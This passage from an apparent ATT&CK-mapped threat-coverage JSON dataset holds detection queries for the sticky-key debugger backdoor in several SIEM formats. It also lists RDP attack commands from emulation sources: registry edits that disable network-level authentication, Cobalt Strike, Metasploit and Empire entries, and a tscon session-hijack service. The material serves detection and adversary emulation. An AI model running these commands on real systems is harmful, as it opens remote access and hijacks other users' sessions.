NT\\\\\\\\\\\\\\\\CurrentVersion\\\\\\\\\\\\\\\\Image\\\\\\\\ File\\\\\\\\ Execution\\\\\\\\ Options\\\\\\\\\\\\\\\\sethc.exe\\\\\\\\\\\\\\\\Debugger OR *\\\\\\\\\\\\\\\\SOFTWARE\\\\\\\\\\\\\\\\Microsoft\\\\\\\\\\\\\\\\Windows\\\\\\\\ NT\\\\\\\\\\\\\\\\CurrentVersion\\\\\\\\\\\\\\\\Image\\\\\\\\ File\\\\\\\\ Execution\\\\\\\\ Options\\\\\\\\\\\\\\\\utilman.exe\\\\\\\\\\\\\\\\Debugger OR *\\\\\\\\\\\\\\\\SOFTWARE\\\\\\\\\\\\\\\\Microsoft\\\\\\\\\\\\\\\\Windows\\\\\\\\ NT\\\\\\\\\\\\\\\\CurrentVersion\\\\\\\\\\\\\\\\Image\\\\\\\\ File\\\\\\\\ Execution\\\\\\\\ Options\\\\\\\\\\\\\\\\osk.exe\\\\\\\\\\\\\\\\Debugger OR *\\\\\\\\\\\\\\\\SOFTWARE\\\\\\\\\\\\\\\\Microsoft\\\\\\\\\\\\\\\\Windows\\\\\\\\ NT\\\\\\\\\\\\\\\\CurrentVersion\\\\\\\\\\\\\\\\Image\\\\\\\\ File\\\\\\\\ Execution\\\\\\\\ Options\\\\\\\\\\\\\\\\Magnify.exe\\\\\\\\\\\\\\\\Debugger OR *\\\\\\\\\\\\\\\\SOFTWARE\\\\\\\\\\\\\\\\Microsoft\\\\\\\\\\\\\\\\Windows\\\\\\\\ NT\\\\\\\\\\\\\\\\CurrentVersion\\\\\\\\\\\\\\\\Image\\\\\\\\ File\\\\\\\\ Execution\\\\\\\\ Options\\\\\\\\\\\\\\\\Narrator.exe\\\\\\\\\\\\\\\\Debugger OR *\\\\\\\\\\\\\\\\SOFTWARE\\\\\\\\\\\\\\\\Microsoft\\\\\\\\\\\\\\\\Windows\\\\\\\\ NT\\\\\\\\\\\\\\\\CurrentVersion\\\\\\\\\\\\\\\\Image\\\\\\\\ File\\\\\\\\ Execution\\\\\\\\ Options\\\\\\\\\\\\\\\\DisplaySwitch.exe\\\\\\\\\\\\\\\\Debugger) AND EventType:\\\\\"SetValue\\\\\")\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Sticky Key Like Backdoor Usage\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\ncurl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Sticky-Key-Like-Backdoor-Usage-2 <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Sticky Key Like Backdoor Usage\",\\n    \"description\": \"Detects the usage and installation of a backdoor that uses an option to register a malicious debugger for built-in tools that are accessible in the login screen\",\\n    \"tags\": [\\n      \"attack.privilege_escalation\",\\n      \"attack.persistence\",\\n      \"attack.t1015\",\\n      \"car.2014-11-003\",\\n      \"car.2014-11-008\"\\n    ],\\n    \"query\": \"(ParentImage.keyword:(*\\\\\\\\\\\\\\\\winlogon.exe) AND CommandLine.keyword:(*cmd.exe\\\\\\\\ sethc.exe\\\\\\\\ * OR *cmd.exe\\\\\\\\ utilman.exe\\\\\\\\ * OR *cmd.exe\\\\\\\\ osk.exe\\\\\\\\ * OR *cmd.exe\\\\\\\\ Magnify.exe\\\\\\\\ * OR *cmd.exe\\\\\\\\ Narrator.exe\\\\\\\\ * OR *cmd.exe\\\\\\\\ DisplaySwitch.exe\\\\\\\\ *))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(ParentImage.keyword:(*\\\\\\\\\\\\\\\\winlogon.exe) AND CommandLine.keyword:(*cmd.exe\\\\\\\\ sethc.exe\\\\\\\\ * OR *cmd.exe\\\\\\\\ utilman.exe\\\\\\\\ * OR *cmd.exe\\\\\\\\ osk.exe\\\\\\\\ * OR *cmd.exe\\\\\\\\ Magnify.exe\\\\\\\\ * OR *cmd.exe\\\\\\\\ Narrator.exe\\\\\\\\ * OR *cmd.exe\\\\\\\\ DisplaySwitch.exe\\\\\\\\ *))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Sticky Key Like Backdoor Usage\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(EventID:\"13\" AND TargetObject.keyword:(*\\\\\\\\SOFTWARE\\\\\\\\Microsoft\\\\\\\\Windows NT\\\\\\\\CurrentVersion\\\\\\\\Image File Execution Options\\\\\\\\sethc.exe\\\\\\\\Debugger *\\\\\\\\SOFTWARE\\\\\\\\Microsoft\\\\\\\\Windows NT\\\\\\\\CurrentVersion\\\\\\\\Image File Execution Options\\\\\\\\utilman.exe\\\\\\\\Debugger *\\\\\\\\SOFTWARE\\\\\\\\Microsoft\\\\\\\\Windows NT\\\\\\\\CurrentVersion\\\\\\\\Image File Execution Options\\\\\\\\osk.exe\\\\\\\\Debugger *\\\\\\\\SOFTWARE\\\\\\\\Microsoft\\\\\\\\Windows NT\\\\\\\\CurrentVersion\\\\\\\\Image File Execution Options\\\\\\\\Magnify.exe\\\\\\\\Debugger *\\\\\\\\SOFTWARE\\\\\\\\Microsoft\\\\\\\\Windows NT\\\\\\\\CurrentVersion\\\\\\\\Image File Execution Options\\\\\\\\Narrator.exe\\\\\\\\Debugger *\\\\\\\\SOFTWARE\\\\\\\\Microsoft\\\\\\\\Windows NT\\\\\\\\CurrentVersion\\\\\\\\Image File Execution Options\\\\\\\\DisplaySwitch.exe\\\\\\\\Debugger) AND EventType:\"SetValue\")\\n(ParentImage.keyword:(*\\\\\\\\winlogon.exe) AND CommandLine.keyword:(*cmd.exe sethc.exe * *cmd.exe utilman.exe * *cmd.exe osk.exe * *cmd.exe Magnify.exe * *cmd.exe Narrator.exe * *cmd.exe DisplaySwitch.exe *))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(EventID=\"13\" (TargetObject=\"*\\\\\\\\SOFTWARE\\\\\\\\Microsoft\\\\\\\\Windows NT\\\\\\\\CurrentVersion\\\\\\\\Image File Execution Options\\\\\\\\sethc.exe\\\\\\\\Debugger\" OR TargetObject=\"*\\\\\\\\SOFTWARE\\\\\\\\Microsoft\\\\\\\\Windows NT\\\\\\\\CurrentVersion\\\\\\\\Image File Execution Options\\\\\\\\utilman.exe\\\\\\\\Debugger\" OR TargetObject=\"*\\\\\\\\SOFTWARE\\\\\\\\Microsoft\\\\\\\\Windows NT\\\\\\\\CurrentVersion\\\\\\\\Image File Execution Options\\\\\\\\osk.exe\\\\\\\\Debugger\" OR TargetObject=\"*\\\\\\\\SOFTWARE\\\\\\\\Microsoft\\\\\\\\Windows NT\\\\\\\\CurrentVersion\\\\\\\\Image File Execution Options\\\\\\\\Magnify.exe\\\\\\\\Debugger\" OR TargetObject=\"*\\\\\\\\SOFTWARE\\\\\\\\Microsoft\\\\\\\\Windows NT\\\\\\\\CurrentVersion\\\\\\\\Image File Execution Options\\\\\\\\Narrator.exe\\\\\\\\Debugger\" OR TargetObject=\"*\\\\\\\\SOFTWARE\\\\\\\\Microsoft\\\\\\\\Windows NT\\\\\\\\CurrentVersion\\\\\\\\Image File Execution Options\\\\\\\\DisplaySwitch.exe\\\\\\\\Debugger\") EventType=\"SetValue\")\\n((ParentImage=\"*\\\\\\\\winlogon.exe\") (CommandLine=\"*cmd.exe sethc.exe *\" OR CommandLine=\"*cmd.exe utilman.exe *\" OR CommandLine=\"*cmd.exe osk.exe *\" OR CommandLine=\"*cmd.exe Magnify.exe *\" OR CommandLine=\"*cmd.exe Narrator.exe *\" OR CommandLine=\"*cmd.exe DisplaySwitch.exe *\"))", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"13\" TargetObject IN [\"*\\\\\\\\SOFTWARE\\\\\\\\Microsoft\\\\\\\\Windows NT\\\\\\\\CurrentVersion\\\\\\\\Image File Execution Options\\\\\\\\sethc.exe\\\\\\\\Debugger\", \"*\\\\\\\\SOFTWARE\\\\\\\\Microsoft\\\\\\\\Windows NT\\\\\\\\CurrentVersion\\\\\\\\Image File Execution Options\\\\\\\\utilman.exe\\\\\\\\Debugger\", \"*\\\\\\\\SOFTWARE\\\\\\\\Microsoft\\\\\\\\Windows NT\\\\\\\\CurrentVersion\\\\\\\\Image File Execution Options\\\\\\\\osk.exe\\\\\\\\Debugger\", \"*\\\\\\\\SOFTWARE\\\\\\\\Microsoft\\\\\\\\Windows NT\\\\\\\\CurrentVersion\\\\\\\\Image File Execution Options\\\\\\\\Magnify.exe\\\\\\\\Debugger\", \"*\\\\\\\\SOFTWARE\\\\\\\\Microsoft\\\\\\\\Windows NT\\\\\\\\CurrentVersion\\\\\\\\Image File Execution Options\\\\\\\\Narrator.exe\\\\\\\\Debugger\", \"*\\\\\\\\SOFTWARE\\\\\\\\Microsoft\\\\\\\\Windows NT\\\\\\\\CurrentVersion\\\\\\\\Image File Execution Options\\\\\\\\DisplaySwitch.exe\\\\\\\\Debugger\"] EventType=\"SetValue\")\\n(event_id=\"1\" ParentImage IN [\"*\\\\\\\\winlogon.exe\"] CommandLine IN [\"*cmd.exe sethc.exe *\", \"*cmd.exe utilman.exe *\", \"*cmd.exe osk.exe *\", \"*cmd.exe Magnify.exe *\", \"*cmd.exe Narrator.exe *\", \"*cmd.exe DisplaySwitch.exe *\"])", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*13)(?=.*(?:.*.*\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Image File Execution Options\\\\sethc\\\\.exe\\\\Debugger|.*.*\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Image File Execution Options\\\\utilman\\\\.exe\\\\Debugger|.*.*\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Image File Execution Options\\\\osk\\\\.exe\\\\Debugger|.*.*\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Image File Execution Options\\\\Magnify\\\\.exe\\\\Debugger|.*.*\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Image File Execution Options\\\\Narrator\\\\.exe\\\\Debugger|.*.*\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Image File Execution Options\\\\DisplaySwitch\\\\.exe\\\\Debugger))(?=.*SetValue))'\\ngrep -P '^(?:.*(?=.*(?:.*.*\\\\winlogon\\\\.exe))(?=.*(?:.*.*cmd\\\\.exe sethc\\\\.exe .*|.*.*cmd\\\\.exe utilman\\\\.exe .*|.*.*cmd\\\\.exe osk\\\\.exe .*|.*.*cmd\\\\.exe Magnify\\\\.exe .*|.*.*cmd\\\\.exe Narrator\\\\.exe .*|.*.*cmd\\\\.exe DisplaySwitch\\\\.exe .*)))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Suspicious Debugger Registration Cmdline\nid: ae215552-081e-44c7-805f-be16f975c8a2\nstatus: experimental\ndescription: Detects the registration of a debugger for a program that is available in the logon screen (sticky key backdoor).\nreferences:\n    - https://blogs.technet.microsoft.com/jonathantrull/2016/10/03/detecting-sticky-key-backdoors/\ntags:\n    - attack.persistence\n    - attack.privilege_escalation\n    - attack.t1015\nauthor: Florian Roth\ndate: 2019/09/06\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine:\n            - '*\\CurrentVersion\\Image File Execution Options\\sethc.exe*'\n            - '*\\CurrentVersion\\Image File Execution Options\\utilman.exe*'\n            - '*\\CurrentVersion\\Image File Execution Options\\osk.exe*'\n            - '*\\CurrentVersion\\Image File Execution Options\\magnify.exe*'\n            - '*\\CurrentVersion\\Image File Execution Options\\narrator.exe*'\n            - '*\\CurrentVersion\\Image File Execution Options\\displayswitch.exe*'\n    condition: selection\nfalsepositives:\n    - Penetration Tests\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Suspicious Debugger Registration Cmdline\nid: ae215552-081e-44c7-805f-be16f975c8a2\nstatus: experimental\ndescription: Detects the registration of a debugger for a program that is available in the logon screen (sticky key backdoor).\nreferences:\n    - https://blogs.technet.microsoft.com/jonathantrull/2016/10/03/detecting-sticky-key-backdoors/\ntags:\n    - attack.persistence\n    - attack.privilege_escalation\n    - attack.t1015\nauthor: Florian Roth\ndate: 2019/09/06\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine:\n            - '*\\CurrentVersion\\Image File Execution Options\\sethc.exe*'\n            - '*\\CurrentVersion\\Image File Execution Options\\utilman.exe*'\n            - '*\\CurrentVersion\\Image File Execution Options\\osk.exe*'\n            - '*\\CurrentVersion\\Image File Execution Options\\magnify.exe*'\n            - '*\\CurrentVersion\\Image File Execution Options\\narrator.exe*'\n            - '*\\CurrentVersion\\Image File Execution Options\\displayswitch.exe*'\n    condition: selection\nfalsepositives:\n    - Penetration Tests\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "CommandLine.keyword:(*\\\\\\\\CurrentVersion\\\\\\\\Image\\\\ File\\\\ Execution\\\\ Options\\\\\\\\sethc.exe* OR *\\\\\\\\CurrentVersion\\\\\\\\Image\\\\ File\\\\ Execution\\\\ Options\\\\\\\\utilman.exe* OR *\\\\\\\\CurrentVersion\\\\\\\\Image\\\\ File\\\\ Execution\\\\ Options\\\\\\\\osk.exe* OR *\\\\\\\\CurrentVersion\\\\\\\\Image\\\\ File\\\\ Execution\\\\ Options\\\\\\\\magnify.exe* OR *\\\\\\\\CurrentVersion\\\\\\\\Image\\\\ File\\\\ Execution\\\\ Options\\\\\\\\narrator.exe* OR *\\\\\\\\CurrentVersion\\\\\\\\Image\\\\ File\\\\ Execution\\\\ Options\\\\\\\\displayswitch.exe*)", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Suspicious-Debugger-Registration-Cmdline <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Suspicious Debugger Registration Cmdline\",\\n    \"description\": \"Detects the registration of a debugger for a program that is available in the logon screen (sticky key backdoor).\",\\n    \"tags\": [\\n      \"attack.persistence\",\\n      \"attack.privilege_escalation\",\\n      \"attack.t1015\"\\n    ],\\n    \"query\": \"CommandLine.keyword:(*\\\\\\\\\\\\\\\\CurrentVersion\\\\\\\\\\\\\\\\Image\\\\\\\\ File\\\\\\\\ Execution\\\\\\\\ Options\\\\\\\\\\\\\\\\sethc.exe* OR *\\\\\\\\\\\\\\\\CurrentVersion\\\\\\\\\\\\\\\\Image\\\\\\\\ File\\\\\\\\ Execution\\\\\\\\ Options\\\\\\\\\\\\\\\\utilman.exe* OR *\\\\\\\\\\\\\\\\CurrentVersion\\\\\\\\\\\\\\\\Image\\\\\\\\ File\\\\\\\\ Execution\\\\\\\\ Options\\\\\\\\\\\\\\\\osk.exe* OR *\\\\\\\\\\\\\\\\CurrentVersion\\\\\\\\\\\\\\\\Image\\\\\\\\ File\\\\\\\\ Execution\\\\\\\\ Options\\\\\\\\\\\\\\\\magnify.exe* OR *\\\\\\\\\\\\\\\\CurrentVersion\\\\\\\\\\\\\\\\Image\\\\\\\\ File\\\\\\\\ Execution\\\\\\\\ Options\\\\\\\\\\\\\\\\narrator.exe* OR *\\\\\\\\\\\\\\\\CurrentVersion\\\\\\\\\\\\\\\\Image\\\\\\\\ File\\\\\\\\ Execution\\\\\\\\ Options\\\\\\\\\\\\\\\\displayswitch.exe*)\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"CommandLine.keyword:(*\\\\\\\\\\\\\\\\CurrentVersion\\\\\\\\\\\\\\\\Image\\\\\\\\ File\\\\\\\\ Execution\\\\\\\\ Options\\\\\\\\\\\\\\\\sethc.exe* OR *\\\\\\\\\\\\\\\\CurrentVersion\\\\\\\\\\\\\\\\Image\\\\\\\\ File\\\\\\\\ Execution\\\\\\\\ Options\\\\\\\\\\\\\\\\utilman.exe* OR *\\\\\\\\\\\\\\\\CurrentVersion\\\\\\\\\\\\\\\\Image\\\\\\\\ File\\\\\\\\ Execution\\\\\\\\ Options\\\\\\\\\\\\\\\\osk.exe* OR *\\\\\\\\\\\\\\\\CurrentVersion\\\\\\\\\\\\\\\\Image\\\\\\\\ File\\\\\\\\ Execution\\\\\\\\ Options\\\\\\\\\\\\\\\\magnify.exe* OR *\\\\\\\\\\\\\\\\CurrentVersion\\\\\\\\\\\\\\\\Image\\\\\\\\ File\\\\\\\\ Execution\\\\\\\\ Options\\\\\\\\\\\\\\\\narrator.exe* OR *\\\\\\\\\\\\\\\\CurrentVersion\\\\\\\\\\\\\\\\Image\\\\\\\\ File\\\\\\\\ Execution\\\\\\\\ Options\\\\\\\\\\\\\\\\displayswitch.exe*)\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Suspicious Debugger Registration Cmdline\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "CommandLine.keyword:(*\\\\\\\\CurrentVersion\\\\\\\\Image File Execution Options\\\\\\\\sethc.exe* *\\\\\\\\CurrentVersion\\\\\\\\Image File Execution Options\\\\\\\\utilman.exe* *\\\\\\\\CurrentVersion\\\\\\\\Image File Execution Options\\\\\\\\osk.exe* *\\\\\\\\CurrentVersion\\\\\\\\Image File Execution Options\\\\\\\\magnify.exe* *\\\\\\\\CurrentVersion\\\\\\\\Image File Execution Options\\\\\\\\narrator.exe* *\\\\\\\\CurrentVersion\\\\\\\\Image File Execution Options\\\\\\\\displayswitch.exe*)", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(CommandLine=\"*\\\\\\\\CurrentVersion\\\\\\\\Image File Execution Options\\\\\\\\sethc.exe*\" OR CommandLine=\"*\\\\\\\\CurrentVersion\\\\\\\\Image File Execution Options\\\\\\\\utilman.exe*\" OR CommandLine=\"*\\\\\\\\CurrentVersion\\\\\\\\Image File Execution Options\\\\\\\\osk.exe*\" OR CommandLine=\"*\\\\\\\\CurrentVersion\\\\\\\\Image File Execution Options\\\\\\\\magnify.exe*\" OR CommandLine=\"*\\\\\\\\CurrentVersion\\\\\\\\Image File Execution Options\\\\\\\\narrator.exe*\" OR CommandLine=\"*\\\\\\\\CurrentVersion\\\\\\\\Image File Execution Options\\\\\\\\displayswitch.exe*\")", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" CommandLine IN [\"*\\\\\\\\CurrentVersion\\\\\\\\Image File Execution Options\\\\\\\\sethc.exe*\", \"*\\\\\\\\CurrentVersion\\\\\\\\Image File Execution Options\\\\\\\\utilman.exe*\", \"*\\\\\\\\CurrentVersion\\\\\\\\Image File Execution Options\\\\\\\\osk.exe*\", \"*\\\\\\\\CurrentVersion\\\\\\\\Image File Execution Options\\\\\\\\magnify.exe*\", \"*\\\\\\\\CurrentVersion\\\\\\\\Image File Execution Options\\\\\\\\narrator.exe*\", \"*\\\\\\\\CurrentVersion\\\\\\\\Image File Execution Options\\\\\\\\displayswitch.exe*\"])", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*.*\\\\CurrentVersion\\\\Image File Execution Options\\\\sethc\\\\.exe.*|.*.*\\\\CurrentVersion\\\\Image File Execution Options\\\\utilman\\\\.exe.*|.*.*\\\\CurrentVersion\\\\Image File Execution Options\\\\osk\\\\.exe.*|.*.*\\\\CurrentVersion\\\\Image File Execution Options\\\\magnify\\\\.exe.*|.*.*\\\\CurrentVersion\\\\Image File Execution Options\\\\narrator\\\\.exe.*|.*.*\\\\CurrentVersion\\\\Image File Execution Options\\\\displayswitch\\\\.exe.*)'", "product": "Atomic Threat Coverage", "name": "grep"}], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "Enable RDP Services:\nREG ADD \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /v UserAuthentication /t REG_DWORD /d 0 /f\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f \nnet start TermService", "name": "Built-in Windows Command"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "Enable RDP Services:\nshell REG ADD \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /v UserAuthentication /t REG_DWORD /d 0 /f\nshell reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f \nshell net start TermService", "name": "Cobalt Strike"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "post/windows/manage/enable_rdp", "name": "Metasploit"}, {"source": "atomics/T1076/T1076.yaml", "command": "query user\nsc.exe create sesshijack binpath= \"cmd.exe /k tscon 1337 /dest:rdp-tcp#55\"\nnet start sesshijack\n", "name": null}, {"source": "atomics/T1076/T1076.yaml", "command": "Connect-RDP -ComputerName #{logonserver} -User $Env:USERDOMAIN\\$ENV:USERNAME\n", "name": null}, {"source": "atomics/T1076/T1076.yaml", "command": "Connect-RDP -ComputerName $ENV:logonserver.TrimStart(\"\\\") -User $Env:USERDOMAIN\\$ENV:USERNAME\n", "name": null}, {"source": "SysmonHunter - Remote Desktop Protocol", "command": "mstsc.exe|tscon.exe", "name": null}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/management/enable_multi_rdp", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/management/enable_multi_rdp", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/management/enable_rdp", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/management/enable_rdp", "name": "Empire Module Command"}], "command_list": ["Enable RDP Services:\nREG ADD \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /v UserAuthentication /t REG_DWORD /d 0 /f\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f \nnet start TermService", "Enable RDP Services:\nshell REG ADD \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /v UserAuthentication /t REG_DWORD /d 0 /f\nshell reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f \nshell net start TermService", "post/windows/manage/enable_rdp", "query user\nsc.exe create sesshijack binpath= \"cmd.exe /k tscon 1337 /dest:rdp-tcp#55\"\nnet start sesshijack\n", "Connect-RDP -ComputerName #{logonserver} -User $Env:USERDOMAIN\\$ENV:USERNAME\n", "Connect-RDP -ComputerName $ENV:logonserver.TrimStart(\"\\\") -User $Env:USERDOMAIN\\$ENV:USERNAME\n", "mstsc.exe|tscon.exe", "powershell/management/enable_multi_rdp", "powershell/management/enable_multi_rdp", "powershell/management/enable_rdp", "powershell/management/enable_rdp"], "technique_id": "T1076", "parsed_datasets": [{"Mitre APT3 Adversary Emulation Field Manual": {"Category": "T1076", "Built-in Windows Command": "Enable RDP Services:\nREG ADD \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /v UserAuthentication /t REG_DWORD /d 0 /f\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f \nnet start TermService", "Cobalt Strike": "Enable RDP Services:\nshell REG ADD \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /v UserAuthentication /t REG_DWORD /d 0 /f\nshell reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f \nshell net start TermService", "Description": "Enable RDP via the registry and services", "Metasploit": "post/windows/manage/enable_rdp"}}, {"Atomic Red Team Test - Remote Desktop Protocol": {"display_name": "Remote Desktop Protocol", "atomic_tests": [{"description": "RDP hijacking](https://medium.com/@networksecurity/rdp-hijacking-how-to-hijack-rds-and-remoteapp-sessions-transparently-to-move-through-an-da2a1e73a5f6) - how to hijack RDS and RemoteApp sessions transparently to move through an organization\n", "supported_platforms": ["windows"], "name": "RDP", "executor": {"elevation_required": true, "command": "query user\nsc.exe create sesshijack binpath= \"cmd.exe /k tscon 1337 /dest:rdp-tcp#55\"\nnet start sesshijack\n", "name": "command_prompt", "cleanup_command": "sc.exe delete sesshijack\n"}}, {"dependencies": [{"description": "Computer must be domain joined\n", "get_prereq_command": "Write-Host Joining this computer to a domain must be done manually\n", "prereq_command": "if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain) { exit 0} else { exit 1}\n"}], "supported_platforms": ["windows"], "name": "RDPto-DomainController", "executor": {"elevation_required": false, "command": "Connect-RDP -ComputerName #{logonserver} -User #{username}\n", "name": "powershell"}, "input_arguments": {"username": {"default": "$Env:USERDOMAIN\\$ENV:USERNAME", "type": "String", "description": "Username argument default %USERDOMAIN%\\%username%"}, "logonserver": {"default": "$ENV:logonserver.TrimStart(\"\\\")", "type": "String", "description": "ComputerName argument default %logonserver%"}}, "description": "Attempt an RDP session via \"Connect-RDP\" to a system. Default RDPs to (%logonserver%) as the current user\n"}], "attack_technique": "T1076"}}, {"SysmonHunter - T1076": {"phase": "Lateral Movement", "query": [{"process": {"any": {"pattern": "mstsc.exe|tscon.exe"}}, "type": "process"}], "description": null, "name": "Remote Desktop Protocol", "level": "medium"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1076", "Empire Module": "powershell/management/enable_multi_rdp", "Technique": "Remote Desktop Protocol", "ATT&CK Technique #2": "T1043", "Concatenate for Python Dictionary": "\"powershell/management/enable_multi_rdp\":  [\"T1076\",\"T1043\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1076", "Empire Module": "powershell/management/enable_rdp", "Technique": "Remote Desktop Protocol", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/management/enable_rdp\":  [\"T1076\"],"}}], "queries": [{"query": "Sysmon| where EventID == 1 